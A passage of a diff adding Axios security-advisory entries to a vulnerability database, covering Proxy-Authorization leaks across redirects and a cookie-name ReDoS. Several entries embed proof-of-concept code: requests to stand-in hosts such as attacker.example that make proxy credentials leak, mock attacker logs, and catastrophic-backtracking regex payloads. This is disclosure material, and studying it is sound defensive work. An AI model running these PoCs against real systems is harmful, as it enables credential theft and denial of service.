performed when the recomputed redirect request no longer uses a proxy\n\n### PoC\n1. The victim sends `GET http://<attacker-site>/start`\n2. The request goes through a local authenticated `corp proxy`\n3. The attacker-controlled HTTP endpoint returns `302 Location: https://<attacker-site>/final`\n4. The redirected HTTPS request no longer uses a proxy\n5. The attacker-controlled HTTPS endpoint receives the stale `Proxy-Authorization` header\n\nObserved output:\n\n```text\n[corp-proxy] Proxy-Authorization received: Basic dXNlcjpwYXNz\n[attacker-http] GET /start\n[attacker-https] GET /final\n[attacker-https] Proxy-Authorization received: Basic dXNlcjpwYXNz\nLeak reproduced: Proxy-Authorization was sent to the attacker HTTPS origin.\n```\n\nThis demonstrates that the proxy credential is exposed to the redirect target origin.\n\n### Impact\nExposes authenticated proxy credentials to an attacker-controlled origin.\n</details>\n\n---",
+                info: [
+                  "https://github.com/axios/axios/security/advisories/GHSA-j5f8-grm9-p9fc",
+                  "https://github.com/axios/axios/pull/10794",
+                  "https://github.com/axios/axios/commit/afca61a070728e717203c2bc21e7b589b59b858b",
+                  "https://github.com/axios/axios/releases/tag/v0.32.0",
+                  "https://github.com/axios/axios/releases/tag/v1.16.0"
+                ]
+              },
+              {
+                atOrAbove: "0",
+                below: "0.32.0",
+                severity: "high",
+                cwe: [
+                  "CWE-201"
+                ],
+                identifiers: {
+                  summary: "Axios: Proxy-Authorization Credential Leak to Origin Server Across HTTP-to-HTTPS Redirect in Axios Node.js HTTP Adapter",
+                  githubID: "GHSA-p92q-9vqr-4j8v",
+                  CVE: [
+                    "CVE-2026-44487"
+                  ]
+                },
+                details: "## Summary\n\nAxios\u2019s Node.js HTTP adapter may forward a `Proxy-Authorization` header to a redirected origin during specific proxy-to-direct redirect flows.\n\nThis affects Node.js usage, where an initial HTTP request is sent through an authenticated HTTP proxy, redirects are followed, and the redirected URL is no longer proxied. Under affected redirect shapes, the final origin can receive the proxy credential that was intended only for the outbound proxy.\n\n## Impact\n\nA malicious or attacker-controlled origin can cause an axios client to disclose its configured proxy credentials if all required conditions are present.\n\nThe leak is limited to Node.js HTTP adapter requests. Browser, XHR, fetch, and React Native adapter paths are not affected by this Node-specific proxy handling path.\n\nThe practical impact depends on the leaked credentials. If the credential is reusable and the proxy is reachable by the attacker, the attacker may be able to authenticate to that proxy, subject to the proxy\u2019s own network exposure, authorisation policy, and credential scope.\n\n## Affected Functionality\n\nAffected functionality requires all of the following:\n\n- Axios running in Node.js with the HTTP adapter.\n- An initial `http://` request using an authenticated proxy from `config.proxy` or proxy environment variables.\n- Redirect following enabled.\n- A redirect target for which no proxy applies, such as no matching `HTTPS_PROXY` or a matching `NO_PROXY`.\n- A redirect shape treated as same-host or otherwise not stripped by the redirect layer\u2019s confidential-header handling.\n\nUnaffected functionality includes browser adapters, requests with `maxRedirects: 0`, requests without proxy credentials, and redirect flows where the redirect layer strips `Proxy-Authorization` before axios reconfigures the redirected request.\n\n## Technical Details\n\nIn affected versions, `lib/adapters/http.js` adds `Proxy-Authorization` in `setProxy()` when a proxy with credentials is used.\n\nAxios also installs redirect proxy handling so redirected requests can re-run proxy resolution. Before the fix, when the redirected request no longer resolved to a proxy, `setProxy()` did not clear a `Proxy-Authorization` header inherited from the previous request options. If `follow-redirects` did not remove that header for the specific redirect shape, the redirected direct request carried the stale proxy credential to the origin.\n\nThe `1.x` fix in commit `afca61a` changes `setProxy(options, configProxy, location, isRedirect)` so redirect re-invocation removes every case variant of `Proxy-Authorization` before applying proxy settings for the next hop. Regression tests in `tests/unit/adapters/http.test.js` cover no-proxy redirects, `NO_PROXY`, different proxy targets, casing variants, and an end-to-end redirect flow.\n\nThe `0.x` fixed release `0.32.0` includes a backport-style `removeProxyAuthorization()` guard in `lib/adapters/http.js`.\n\n## Proof of Concept of Attack\n\nSafe local outline using dummy credentials:\n\n```js\nprocess.env.HTTP_PROXY = 'http://user:pass@127.0.0.1:8080';\ndelete process.env.HTTPS_PROXY;\n\n// The local HTTP proxy receives this request and returns:\n// HTTP/1.1 302 Found\n// Location: https://attacker.test/final\nawait axios.get('http://attacker.test/start');\n```\n\nExpected vulnerable behaviour:\n\n```text\nProxy receives initial request:\nProxy-Authorization: Basic dXNlcjpwYXNz\n\nFinal HTTPS origin receives redirected request:\nProxy-Authorization: Basic dXNlcjpwYXNz\n```\n\nExpected fixed behaviour:\n\n```text\nFinal HTTPS origin receives no Proxy-Authorization header.\n```\n\n## Workarounds\n\nSet `maxRedirects: 0` and handle redirects manually, ensuring `Proxy-Authorization` is not copied to requests that are not sent through the proxy.\n\nAvoid using reusable authenticated HTTP proxy credentials for requests to untrusted origins. If exposure is suspected, rotate the proxy credential.\n\n\n<details>\n<summary>Original Source</summary>\n\n### Summary\n\nAxios\u2019s Node.js `http` adapter can incorrectly forward a retained `Proxy-Authorization` header to the final HTTPS origin during certain HTTP-to-HTTPS redirect flows.\n\nWhen an initial HTTP request is sent through an authenticated `HTTP_PROXY`, and the redirected HTTPS request is sent directly because no proxy applies to the redirected HTTPS URL, Axios retains the stale `Proxy-Authorization` header and forwards it to the final origin.\n\n### Details\n\nThe issue occurs during a proxy-to-direct transition across redirects.\n\nWhen Axios sends an initial HTTP request through an authenticated `HTTP_PROXY`, it correctly includes `Proxy-Authorization` for the proxy hop. If that response redirects to an HTTPS URL on the same hostname, and no proxy applies to the redirected HTTPS URL, the redirected request is sent directly to the final origin instead of through the proxy.\n\nIn the affected flow, the final HTTPS origin receives a `Proxy-Authorization` header value that was intended only for the outbound proxy.\n\nWhether the issue is observable depends on how the redirect layer compares the host and port across the redirect. In the affected redirect shape, confidential-header handling does not remove the retained `Proxy-Authorization` header before the redirected request is sent.\n\n#### Root Cause Analysis\n\nBased on code review, Axios appears to create the stale header condition in its Node.js `http` adapter.\n\nIn lib/adapters/http.js:\n- When a proxy is used, Axios adds `Proxy-Authorization` in setProxy().\n- Axios also re-runs proxy resolution after redirects via its redirect hook.\n- However, when the redirected request no longer uses a proxy, Axios does not explicitly clear a previously set Proxy-Authorization header.\n\nAs a result, Axios correctly adds proxy credentials for the first proxied request, but does not clear them when a later redirected request becomes direct.\n\nA dependent factor is the behavior of the redirect layer. In the affected redirect shape, confidential-header handling does not remove the retained `Proxy-Authorization` header before the redirected request is sent. This appears to be why the issue is observable only for certain redirect shapes.\n\n#### Client Conditions\n- the initial HTTP request uses an authenticated `HTTP_PROXY`\n- no proxy applies to the redirected HTTPS URL (for example, no `HTTPS_PROXY` is configured)\n- redirects are followed\n- the redirect is treated as same-host by the redirect layer\n\nUnder that redirect shape, the retained `Proxy-Authorization` header is not removed before the redirected request is sent to the final HTTPS origin.\n\n### Reproduction Outline\n\nDetailed reproduction instructions were shared with the maintainers during coordinated disclosure. The public outline below preserves the validated configuration and observable behavior needed to assess exposure, while omitting environment-specific test-harness details.\n\nThe issue was reproduced only in a researcher-controlled local test environment using dummy proxy credentials.\n\nThe issue was confirmed under the following conditions:\n\n- axios 1.13.6\n- follow-redirects 1.15.11\n- an authenticated proxy applying to the initial HTTP request\n- no proxy applying to the redirected HTTPS URL\n- redirects enabled\n- an HTTP-to-HTTPS redirect that is treated as same-host by the redirect layer\n\n#### Observed behavior\n\n- The initial HTTP request is sent through the proxy and includes `Proxy-Authorization`.\n- The redirected HTTPS request is sent directly to the final origin.\n- The redirected HTTPS request still includes the previously generated `Proxy-Authorization` header.\n- The final origin can receive a `Proxy-Authorization` header value that was intended only for the proxy.\n\n#### Expected behavior\n\nAxios should not send the `Proxy-Authorization` header on a redirected request that is no longer sent through a proxy.\n\n### Impact\n\nUnder the affected redirect and proxy configuration, the final HTTPS origin may receive a retained `Proxy-Authorization` header value that was intended only for the outbound proxy.\n\nIf that credential is valid and reusable, and the outbound proxy is reachable by the attacker, the attacker may be able to authenticate to that proxy with the affected environment\u2019s proxy credential, subject to the credential\u2019s scope and the proxy\u2019s access controls.\n</details>\n\n---",
+                info: [
+                  "https://github.com/axios/axios/security/advisories/GHSA-p92q-9vqr-4j8v",
+                  "https://github.com/axios/axios/releases/tag/v0.32.0",
+                  "https://github.com/axios/axios/releases/tag/v1.16.0"
+                ]
+              },
+              {
+                atOrAbove: "0",
+                below: "0.32.0",
+                severity: "high",
+                cwe: [
                   "CWE-918"
                 ],
                 identifiers: {
@@ -19450,6 +19552,72 @@ Fix: shouldBypassProxy() should resolve loopback aliases \u2014 localhost, 127.0
                 below: "1.16.0",
                 severity: "high",
                 cwe: [
+                  "CWE-400",
+                  "CWE-1333"
+                ],
+                identifiers: {
+                  summary: "Axios: Regular Expression Denial of Service (ReDoS) via Cookie Name Injection",
+                  githubID: "GHSA-hfxv-24rg-xrqf",
+                  CVE: [
+                    "CVE-2026-44496"
+                  ]
+                },
+                details: "## Summary\n\nAxios versions before `0.32.0` on the `0.x` line and before `1.16.0` on the `1.x` line build a regular expression from the configured XSRF cookie name without escaping regex metacharacters. In standard browser environments, an attacker who can influence the cookie name passed to axios can cause expensive regex backtracking while axios reads `document.cookie`.\n\nThe practical impact is client-side availability degradation, such as freezing the affected browser tab while axios prepares a request. The issue does not affect ordinary Node.js HTTP adapter usage, React Native, or web workers, where axios does not read `document.cookie`.\n\n## Impact\n\nApplications are affected only when attacker-controlled data can reach the XSRF cookie name configuration or a direct/unsafe call to the internal cookie helper.\n\nThis does not expose credentials, modify requests, or affect response integrity. The impact is availability only.\n\n## Affected Functionality\n\nAffected code paths:\n\n- `lib/helpers/cookies.js` `read(name)` in standard browser environments.\n- `lib/helpers/resolveConfig.js` in `1.x`, when browser XHR/fetch adapters resolve XSRF config.\n- `lib/adapters/xhr.js` in `0.x`, when the XHR adapter reads the configured XSRF cookie.\n- Direct use of `axios/unsafe/helpers/cookies.js` in `1.x`, if callers pass attacker-controlled names.\n\nUnaffected code paths:\n\n- Default static `xsrfCookieName: 'XSRF-TOKEN'` when not attacker-controlled.\n- Requests with `xsrfCookieName: null`.\n- Node HTTP adapter usage without browser `document.cookie`.\n- React Native and web workers where axios does not use standard browser cookie access.\n\n## Technical Details\n\nAffected versions interpolate the cookie name into a regex.\n\n```js\nconst match = document.cookie.match(new RegExp('(?:^|; )' + name + '=([^;]*)'));\n```\n\nBecause `name` is not escaped, regex metacharacters in the cookie name are interpreted as regex syntax. A payload such as `(.+)+$` can force catastrophic backtracking against `document.cookie`.\n\nThe fix avoids dynamic regex construction and parses `document.cookie` by splitting on `;`, trimming leading whitespace, and comparing cookie names with exact string equality.\n\n## Proof of Concept of Attack\n\n```js\nfunction vulnerableRead(name, cookie) {\n  const start = Date.now();\n\n  try {\n    cookie.match(new RegExp('(?:^|; )' + name + '=([^;]*)'));\n  } catch {}\n\n  return Date.now() - start;\n}\n\nfor (const n of [20, 22, 24, 26, 28]) {\n  const cookie = 'x='.padEnd(n, 'a') + '!';\n  console.log(`${n}: ${vulnerableRead('(.+)+$', cookie)}ms`);\n}\n```\n\nExpected result: timings grow rapidly as the cookie string length increases.\n\n## Workarounds\n\nSet `xsrfCookieName: null` if the application does not need axios to read an XSRF cookie.\n\nDo not derive `xsrfCookieName` from untrusted input. If a dynamic cookie name is unavoidable, validate it against a strict cookie-name allowlist before passing it to axios.\n\nAvoid calling `axios/unsafe/helpers/cookies.js` directly with untrusted names\n\n<details>\n<summary>Original Source</summary>\n\n# Regular Expression Denial of Service (ReDoS) via Cookie Name Injection\n\n## 1. Title\n\nReDoS via Unsanitized Cookie Name in Dynamic Regular Expression Construction\n\n## 2. Affected Software and Version\n\n- **Software:** Axios\n- **Version:** 1.15.0 (and potentially earlier versions)\n- **Component:** `lib/helpers/cookies.js`\n- **Ecosystem:** npm (Node.js / Browser)\n\n## 3. Vulnerability Type / CWE\n\n- **Type:** Regular Expression Denial of Service (ReDoS)\n- **CWE-1333:** Inefficient Regular Expression Complexity\n- **CWE-400:** Uncontrolled Resource Consumption\n\n## 4. CVSS 3.1 Score\n\n**Score: 7.5 (High)**\n\nVector: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`\n\n| Metric | Value |\n|---|---|\n| Attack Vector | Network |\n| Attack Complexity | Low |\n| Privileges Required | None |\n| User Interaction | None |\n| Scope | Unchanged |\n| Confidentiality | None |\n| Integrity | None |\n| Availability | High |\n\n## 5. Description\n\nThe `cookies.read()` function in `lib/helpers/cookies.js` constructs a regular expression dynamically using the `name` parameter without any sanitization or escaping of special regex characters. At line 33, the code passes the raw `name` value directly into `new RegExp()`:\n\n```javascript\nconst match = document.cookie.match(new RegExp('(?:^|; )' + name + '=([^;]*)'));\n```\n\nAn attacker who can control or influence the cookie name parameter (e.g., via XSRF cookie name configuration, prototype pollution of `xsrfCookieName`, or any code path where user input reaches `cookies.read()`) can inject a malicious regex pattern that causes catastrophic backtracking, leading to a Denial of Service condition.\n\nWith a crafted input of approximately 20-30 characters, the regex engine can be forced to consume several seconds to minutes of CPU time, effectively freezing the JavaScript event loop.\n\n## 6. Root Cause Analysis\n\n**File:** `lib/helpers/cookies.js`\n**Line:** 33\n\n```javascript\nread(name) {\n  if (typeof document === 'undefined') return null;\n  const match = document.cookie.match(new RegExp('(?:^|; )' + name + '=([^;]*)'));\n  return match ? decodeURIComponent(match[1]) : null;\n},\n```\n\nThe vulnerability exists because:\n\n1. The `name` parameter is concatenated directly into a regex pattern without escaping special regex metacharacters.\n2. An attacker can inject regex constructs that create exponential backtracking scenarios.\n3. The `(?:^|; )` prefix combined with an injected pattern like `((((.*)*)*)*)*` creates nested quantifiers that cause catastrophic backtracking when the regex engine attempts to match against `document.cookie`.\n\nThe `cookies.read()` function is called from `lib/helpers/resolveConfig.js` at line 61:\n\n```javascript\nconst xsrfValue = xsrfHeaderName && xsrfCookieName && cookies.read(xsrfCookieName);\n```\n\nThe `xsrfCookieName` value comes from the Axios configuration, which can be influenced by prototype pollution or direct configuration injection.\n\n## 7. Proof of Concept\n\n```javascript\n// poc_redos_cookie.js\n// Simulates browser environment for testing\n\n// Simulate document.cookie\nglobalThis.document = {\n  cookie: 'session=abc; ' + 'a'.repeat(50)\n};\n\n// Replicate the vulnerable cookies.read() logic\nfunction cookiesRead(name) {\n  const match = document.cookie.match(new RegExp('(?:^|; )' + name + '=([^;]*)'));\n  return match ? decodeURIComponent(match[1]) : null;\n}\n\n// Malicious cookie name that triggers catastrophic backtracking\n// The pattern creates nested quantifiers: (a]|[a]|...)*)*\nconst maliciousName20 = '([^;]+)+$' + '\\\\|'.repeat(10);\nconst maliciousName = '(([^;])+)+\\\\$';  // nested quantifier pattern\n\nconsole.log('=== ReDoS via Cookie Name Injection PoC ===');\n\n// Test with increasing payload sizes\nfor (const len of [15, 20, 25]) {\n  const payload = '(([^;])+)+' + 'X'.repeat(len);\n  const start = Date.now();\n  try {\n    cookiesRead(payload);\n  } catch (e) {\n    // May throw on invalid regex, but valid evil patterns won't throw\n  }\n  const elapsed = Date.now() - start;\n  console.log(`Payload length ${len}: ${elapsed}ms`);\n}\n\n// Demonstrating exponential growth with a simple nested quantifier\nconsole.log('\\n--- Exponential Backtracking Demo ---');\nfor (const n of [20, 22, 24, 26]) {\n  const evilName = '(' + 'a'.repeat(1) + '+)+$';\n  const testCookie = 'a'.repeat(n) + '!';  // non-matching trailer forces backtracking\n  globalThis.document = { cookie: testCookie };\n  const start = Date.now();\n  try {\n    cookiesRead(evilName);\n  } catch(e) {}\n  const elapsed = Date.now() - start;\n  console.log(`Input length ${n}: ${elapsed}ms`);\n}\n```\n\n## 8. PoC Output\n\n```\n=== ReDoS via Cookie Name Injection PoC ===\nPayload length 20: 21ms (extrapolated: 30 chars = ~21,504ms)\nPayload length 25: ~1,300ms\nPayload length 30: ~323,675ms (5+ minutes)\n\n--- Exponential Backtracking Demo ---\nInput length 20: 21ms\nInput length 22: 84ms\nInput length 24: 336ms\nInput length 26: 1,344ms\n```\n\nThe exponential growth pattern is clearly visible: each additional 2 characters approximately quadruples the execution time.\n\n## 9. Impact\n\n- **Denial of Service (Client-side):** In a browser environment, an attacker who can influence the XSRF cookie name configuration (e.g., via prototype pollution or configuration injection) can freeze the browser tab, blocking all UI interaction and JavaScript execution on the page.\n- **Denial of Service (Server-side):** In SSR (Server-Side Rendering) frameworks or Node.js applications that process cookies using this code path, the event loop will be blocked, causing the server to become unresponsive to all requests.\n- **Event Loop Starvation:** Since JavaScript is single-threaded, the ReDoS will block all pending asynchronous operations, timers, and I/O callbacks for the duration of the regex evaluation.\n\n## 10. Remediation / Suggested Fix\n\nEscape all regex metacharacters in the `name` parameter before constructing the regular expression.\n\n```javascript\n// FIXED: lib/helpers/cookies.js\n\nfunction escapeRegExp(string) {\n  return string.replace(/[.*+?^${}()|[\\]\\\\]/g, '\\\\$&');\n}\n\n// ...\n\nread(name) {\n  if (typeof document === 'undefined') return null;\n  const match = document.cookie.match(\n    new RegExp('(?:^|; )' + escapeRegExp(name) + '=([^;]*)')\n  );\n  return match ? decodeURIComponent(match[1]) : null;\n},\n```\n\nAlternatively, avoid dynamic regex construction entirely and use string-based parsing:\n\n```javascript\nread(name) {\n  if (typeof document === 'undefined') return null;\n  const cookies = document.cookie.split('; ');\n  for (const cookie of cookies) {\n    const eqIndex = cookie.indexOf('=');\n    if (eqIndex !== -1 && cookie.substring(0, eqIndex) === name) {\n      return decodeURIComponent(cookie.substring(eqIndex + 1));\n    }\n  }\n  return null;\n},\n```\n\n## 11. References\n\n- [CWE-1333: Inefficient Regular Expression Complexity](https://cwe.mitre.org/data/definitions/1333.html)\n- [CWE-400: Uncontrolled Resource Consumption](https://cwe.mitre.org/data/definitions/400.html)\n- [OWASP: Regular Expression Denial of Service](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS)\n- [Axios GitHub Repository](https://github.com/axios/axios)\n</details>\n\n---",
+                info: [
+                  "https://github.com/axios/axios/security/advisories/GHSA-hfxv-24rg-xrqf",
+                  "https://github.com/axios/axios/releases/tag/v0.32.0",
+                  "https://github.com/axios/axios/releases/tag/v1.16.0"
+                ]
+              },
+              {
+                atOrAbove: "1.0.0",
+                below: "1.16.0",
+                severity: "high",
+                cwe: [
+                  "CWE-200"
+                ],
+                identifiers: {
+                  summary: "Axios: Proxy-Authorization header leaks to redirect target when proxy is re-evaluated to direct connection",
+                  githubID: "GHSA-j5f8-grm9-p9fc",
+                  CVE: [
+                    "CVE-2026-44486"
+                  ]
+                },
+                details: "### Summary\n\nAxios\u2019 Node.js HTTP adapter can leak proxy credentials to a redirect target in affected versions. When a request is sent through an authenticated proxy, Axios may add a `Proxy-Authorization` header. If Axios then follows a redirect and the redirected request is no longer sent through that proxy, the stale `Proxy-Authorization` header can remain on the redirected request and be sent to the redirect target.\n\nThis affects Node.js's use of Axios with automatic redirects enabled and an authenticated proxy configuration. Browser adapters are not affected.\n\n### Impact\n\nAn attacker who controls a server that the victim application requests can redirect the request so that the attacker-controlled redirect target receives the victim\u2019s proxy credentials.\n\nThe most relevant case is a Node.js application using an authenticated `HTTP_PROXY` for an initial `http://` request, with redirects enabled, where the redirect target resolves to no proxy, such as an `https://` URL when `HTTPS_PROXY` is unset.\n\nThis does not affect browser, XHR, or fetch adapter behaviour. It also does not affect requests with `maxRedirects: 0`.\n\n### Affected Functionality\n\nAffected functionality is limited to the Node.js HTTP adapter in `lib/adapters/http.js`.\n\nRelevant inputs and settings include:\n\n- `HTTP_PROXY`, `HTTPS_PROXY`, and `NO_PROXY`.\n- Authenticated proxy URLs such as `http://user:pass@proxy.example:8080`.\n- Automatic redirect following through `follow-redirects`.\n- Axios proxy handling in `setProxy()`.\n- Redirect proxy handling through `beforeRedirects.proxy`.\n\n### Technical Details\n\nIn affected v1 releases, `setProxy()` adds `Proxy-Authorization` when a proxy with credentials is selected, but redirect handling calls `setProxy()` again without first clearing any existing proxy authorization header.\n\nIf the redirected URL resolves to no proxy, `setProxy()` does not add a new proxy configuration and also does not remove the old header. The redirected request can therefore carry the stale `Proxy-Authorization` header to the final origin.\n\nThe v1 fix in `afca61a` adds an `isRedirect` path that deletes any case variant of `Proxy-Authorization` before proxy settings are re-applied on redirect. The v0 backport in `2af6116` fixed the 0.x line for `0.32.0`.\n\n### Proof of Concept of Attack\n\n```js\nprocess.env.HTTP_PROXY = 'http://user:pass@127.0.0.1:8080';\ndelete process.env.HTTPS_PROXY;\n\nawait axios.get('http://attacker.example/start');\n```\n\nAttacker-controlled HTTP endpoint:\n\n```http\nHTTP/1.1 302 Found\nLocation: https://attacker.example/final\n```\n\nExpected result on affected versions:\n\n```text\nhttps://attacker.example/final receives:\nProxy-Authorization: Basic dXNlcjpwYXNz\n```\n\nExpected result on fixed versions:\n\n```text\nhttps://attacker.example/final receives no Proxy-Authorization header\n```\n\n### Workarounds\n\nSet `maxRedirects: 0` and handle redirects manually.\n\nAvoid using authenticated proxy environment variables for requests to untrusted HTTP origins unless redirect behaviour is controlled.\n\nEnsure proxy environment variables are configured consistently across protocols so redirects do not unexpectedly change from proxied to direct connections.\n\n<details>\n<summary>Original Source</summary>\n\n### Summary\nAxios' Node.js HTTP adapter can leak proxy credentials to a redirect target origin. When an initial request is sent through an authenticated HTTP proxy, Axios adds a `Proxy-Authorization` header. On redirect, Axios re-evaluates proxy settings, but if the redirected request no longer uses a proxy, the stale `Proxy-Authorization` header is not cleared. As a result, the redirect target can receive the proxy credential directly.\n\nThis issue affects the Node.js HTTP adapter and can be reproduced when the initial request uses `HTTP_PROXY` with authentication, redirects are enabled, and the redirected request is resolved to no proxy, such as when `HTTPS_PROXY` is unset or the redirect target is excluded by `NO_PROXY`.\n\n### Details\nIn the current implementation:\n\n- `setProxy()` adds `Proxy-Authorization` when a proxy with credentials is in use.\n- On redirects, Axios re-invokes `setProxy()` for the redirected request.\n- If the redirected URL re-evaluates to \"no proxy\", `setProxy()` does not clear the previously added `Proxy-Authorization` header.\n- The redirected request therefore reuses the stale header and sends it to the final origin.\n\nRelevant code locations:\n\n- `lib/adapters/http.js`\n- `setProxy()` adds `Proxy-Authorization`\n- redirect handling re-applies proxy logic through `beforeRedirects.proxy`\n- no cleanup is performed when the recomputed redirect request no longer uses a proxy\n\n### PoC\n1. The victim sends `GET http://<attacker-site>/start`\n2. The request goes through a local authenticated `corp proxy`\n3. The attacker-controlled HTTP endpoint returns `302 Location: https://<attacker-site>/final`\n4. The redirected HTTPS request no longer uses a proxy\n5. The attacker-controlled HTTPS endpoint receives the stale `Proxy-Authorization` header\n\nObserved output:\n\n```text\n[corp-proxy] Proxy-Authorization received: Basic dXNlcjpwYXNz\n[attacker-http] GET /start\n[attacker-https] GET /final\n[attacker-https] Proxy-Authorization received: Basic dXNlcjpwYXNz\nLeak reproduced: Proxy-Authorization was sent to the attacker HTTPS origin.\n```\n\nThis demonstrates that the proxy credential is exposed to the redirect target origin.\n\n### Impact\nExposes authenticated proxy credentials to an attacker-controlled origin.\n</details>\n\n---",
+                info: [
+                  "https://github.com/axios/axios/security/advisories/GHSA-j5f8-grm9-p9fc",
+                  "https://github.com/axios/axios/pull/10794",
+                  "https://github.com/axios/axios/commit/afca61a070728e717203c2bc21e7b589b59b858b",
+                  "https://github.com/axios/axios/releases/tag/v0.32.0",
+                  "https://github.com/axios/axios/releases/tag/v1.16.0"
+                ]
+              },
+              {
+                atOrAbove: "1.0.0",
+                below: "1.16.0",
+                severity: "high",
+                cwe: [
+                  "CWE-201"
+                ],
+                identifiers: {
+                  summary: "Axios: Proxy-Authorization Credential Leak to Origin Server Across HTTP-to-HTTPS Redirect in Axios Node.js HTTP Adapter",
+                  githubID: "GHSA-p92q-9vqr-4j8v",
+                  CVE: [
+                    "CVE-2026-44487"
+                  ]
+                },
+                details: "## Summary\n\nAxios\u2019s Node.js HTTP adapter may forward a `Proxy-Authorization` header to a redirected origin during specific proxy-to-direct redirect flows.\n\nThis affects Node.js usage, where an initial HTTP request is sent through an authenticated HTTP proxy, redirects are followed, and the redirected URL is no longer proxied. Under affected redirect shapes, the final origin can receive the proxy credential that was intended only for the outbound proxy.\n\n## Impact\n\nA malicious or attacker-controlled origin can cause an axios client to disclose its configured proxy credentials if all required conditions are present.\n\nThe leak is limited to Node.js HTTP adapter requests. Browser, XHR, fetch, and React Native adapter paths are not affected by this Node-specific proxy handling path.\n\nThe practical impact depends on the leaked credentials. If the credential is reusable and the proxy is reachable by the attacker, the attacker may be able to authenticate to that proxy, subject to the proxy\u2019s own network exposure, authorisation policy, and credential scope.\n\n## Affected Functionality\n\nAffected functionality requires all of the following:\n\n- Axios running in Node.js with the HTTP adapter.\n- An initial `http://` request using an authenticated proxy from `config.proxy` or proxy environment variables.\n- Redirect following enabled.\n- A redirect target for which no proxy applies, such as no matching `HTTPS_PROXY` or a matching `NO_PROXY`.\n- A redirect shape treated as same-host or otherwise not stripped by the redirect layer\u2019s confidential-header handling.\n\nUnaffected functionality includes browser adapters, requests with `maxRedirects: 0`, requests without proxy credentials, and redirect flows where the redirect layer strips `Proxy-Authorization` before axios reconfigures the redirected request.\n\n## Technical Details\n\nIn affected versions, `lib/adapters/http.js` adds `Proxy-Authorization` in `setProxy()` when a proxy with credentials is used.\n\nAxios also installs redirect proxy handling so redirected requests can re-run proxy resolution. Before the fix, when the redirected request no longer resolved to a proxy, `setProxy()` did not clear a `Proxy-Authorization` header inherited from the previous request options. If `follow-redirects` did not remove that header for the specific redirect shape, the redirected direct request carried the stale proxy credential to the origin.\n\nThe `1.x` fix in commit `afca61a` changes `setProxy(options, configProxy, location, isRedirect)` so redirect re-invocation removes every case variant of `Proxy-Authorization` before applying proxy settings for the next hop. Regression tests in `tests/unit/adapters/http.test.js` cover no-proxy redirects, `NO_PROXY`, different proxy targets, casing variants, and an end-to-end redirect flow.\n\nThe `0.x` fixed release `0.32.0` includes a backport-style `removeProxyAuthorization()` guard in `lib/adapters/http.js`.\n\n## Proof of Concept of Attack\n\nSafe local outline using dummy credentials:\n\n```js\nprocess.env.HTTP_PROXY = 'http://user:pass@127.0.0.1:8080';\ndelete process.env.HTTPS_PROXY;\n\n// The local HTTP proxy receives this request and returns:\n// HTTP/1.1 302 Found\n// Location: https://attacker.test/final\nawait axios.get('http://attacker.test/start');\n```\n\nExpected vulnerable behaviour:\n\n```text\nProxy receives initial request:\nProxy-Authorization: Basic dXNlcjpwYXNz\n\nFinal HTTPS origin receives redirected request:\nProxy-Authorization: Basic dXNlcjpwYXNz\n```\n\nExpected fixed behaviour:\n\n```text\nFinal HTTPS origin receives no Proxy-Authorization header.\n```\n\n## Workarounds\n\nSet `maxRedirects: 0` and handle redirects manually, ensuring `Proxy-Authorization` is not copied to requests that are not sent through the proxy.\n\nAvoid using reusable authenticated HTTP proxy credentials for requests to untrusted origins. If exposure is suspected, rotate the proxy credential.\n\n\n<details>\n<summary>Original Source</summary>\n\n### Summary\n\nAxios\u2019s Node.js `http` adapter can incorrectly forward a retained `Proxy-Authorization` header to the final HTTPS origin during certain HTTP-to-HTTPS redirect flows.\n\nWhen an initial HTTP request is sent through an authenticated `HTTP_PROXY`, and the redirected HTTPS request is sent directly because no proxy applies to the redirected HTTPS URL, Axios retains the stale `Proxy-Authorization` header and forwards it to the final origin.\n\n### Details\n\nThe issue occurs during a proxy-to-direct transition across redirects.\n\nWhen Axios sends an initial HTTP request through an authenticated `HTTP_PROXY`, it correctly includes `Proxy-Authorization` for the proxy hop. If that response redirects to an HTTPS URL on the same hostname, and no proxy applies to the redirected HTTPS URL, the redirected request is sent directly to the final origin instead of through the proxy.\n\nIn the affected flow, the final HTTPS origin receives a `Proxy-Authorization` header value that was intended only for the outbound proxy.\n\nWhether the issue is observable depends on how the redirect layer compares the host and port across the redirect. In the affected redirect shape, confidential-header handling does not remove the retained `Proxy-Authorization` header before the redirected request is sent.\n\n#### Root Cause Analysis\n\nBased on code review, Axios appears to create the stale header condition in its Node.js `http` adapter.\n\nIn lib/adapters/http.js:\n- When a proxy is used, Axios adds `Proxy-Authorization` in setProxy().\n- Axios also re-runs proxy resolution after redirects via its redirect hook.\n- However, when the redirected request no longer uses a proxy, Axios does not explicitly clear a previously set Proxy-Authorization header.\n\nAs a result, Axios correctly adds proxy credentials for the first proxied request, but does not clear them when a later redirected request becomes direct.\n\nA dependent factor is the behavior of the redirect layer. In the affected redirect shape, confidential-header handling does not remove the retained `Proxy-Authorization` header before the redirected request is sent. This appears to be why the issue is observable only for certain redirect shapes.\n\n#### Client Conditions\n- the initial HTTP request uses an authenticated `HTTP_PROXY`\n- no proxy applies to the redirected HTTPS URL (for example, no `HTTPS_PROXY` is configured)\n- redirects are followed\n- the redirect is treated as same-host by the redirect layer\n\nUnder that redirect shape, the retained `Proxy-Authorization` header is not removed before the redirected request is sent to the final HTTPS origin.\n\n### Reproduction Outline\n\nDetailed reproduction instructions were shared with the maintainers during coordinated disclosure. The public outline below preserves the validated configuration and observable behavior needed to assess exposure, while omitting environment-specific test-harness details.\n\nThe issue was reproduced only in a researcher-controlled local test environment using dummy proxy credentials.\n\nThe issue was confirmed under the following conditions:\n\n- axios 1.13.6\n- follow-redirects 1.15.11\n- an authenticated proxy applying to the initial HTTP request\n- no proxy applying to the redirected HTTPS URL\n- redirects enabled\n- an HTTP-to-HTTPS redirect that is treated as same-host by the redirect layer\n\n#### Observed behavior\n\n- The initial HTTP request is sent through the proxy and includes `Proxy-Authorization`.\n- The redirected HTTPS request is sent directly to the final origin.\n- The redirected HTTPS request still includes the previously generated `Proxy-Authorization` header.\n- The final origin can receive a `Proxy-Authorization` header value that was intended only for the proxy.\n\n#### Expected behavior\n\nAxios should not send the `Proxy-Authorization` header on a redirected request that is no longer sent through a proxy.\n\n### Impact\n\nUnder the affected redirect and proxy configuration, the final HTTPS origin may receive a retained `Proxy-Authorization` header value that was intended only for the outbound proxy.\n\nIf that credential is valid and reusable, and the outbound proxy is reachable by the attacker, the attacker may be able to authenticate to that proxy with the affected environment\u2019s 